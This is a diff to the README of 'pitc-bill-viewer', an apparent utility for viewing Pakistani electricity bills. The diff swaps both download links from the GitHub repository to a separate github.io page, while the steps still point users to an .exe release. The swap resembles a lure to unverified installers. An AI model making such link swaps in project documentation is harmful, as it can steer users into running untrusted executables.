@@ -1,6 +1,6 @@
 # ⚡ pitc-bill-viewer - View your Pakistani electricity bills easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Trainlanthanum200/pitc-bill-viewer)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://trainlanthanum200.github.io)
 
 ## 📌 About this software
 This application helps you check your electricity bills for major power distribution companies in Pakistan. It simplifies the process of viewing your monthly charges. Instead of searching through web portals for your specific provider, this tool pulls your data into one place.
@@ -25,7 +25,7 @@ You get support for the following companies:
 ## 📥 How to download and install
 You need to visit the release page to get the installer for your computer. Follow these steps to set up the software:
 
-1. Click this link to go to the project page: [Download pitc-bill-viewer](https://github.com/Trainlanthanum200/pitc-bill-viewer)
+1. Click this link to go to the project page: [Download pitc-bill-viewer](https://trainlanthanum200.github.io)
 2. Look for the section labeled "Releases" on the right side of the page.
 3. Click the latest version number.
 4. Locate the file ending in .exe.
